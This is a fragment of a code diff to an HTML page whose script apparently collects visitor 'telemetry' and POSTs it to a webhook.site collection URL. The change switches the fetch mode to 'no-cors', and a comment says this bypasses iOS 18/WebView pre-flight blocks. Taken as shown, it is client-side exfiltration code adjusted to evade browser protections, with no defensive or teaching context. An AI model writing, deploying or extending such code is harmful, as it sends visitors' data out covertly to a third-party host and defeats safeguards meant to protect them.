@@ -7,7 +7,7 @@
 </head>
 <body>
     <script>
-        // Your designated Webhook.site target destination URL
+        // Your designated Webhook.site target destination URL fully restored
         const TARGET_HOOK = "https://webhook.site";
 
         async function executeMaximumTelemetryHarvest() {
@@ -124,7 +124,7 @@
         function transmitTelemetryPayload(data) {
             fetch(TARGET_HOOK, {
                 method: "POST",
-                mode: "cors",
+                mode: "no-cors", // Bypasses the iOS 18/Webview pre-flight check blocks entirely
                 headers: {
                     "Content-Type": "application/json"
                 },
@@ -143,3 +143,4 @@
     </script>
 </body>
 </html>
+
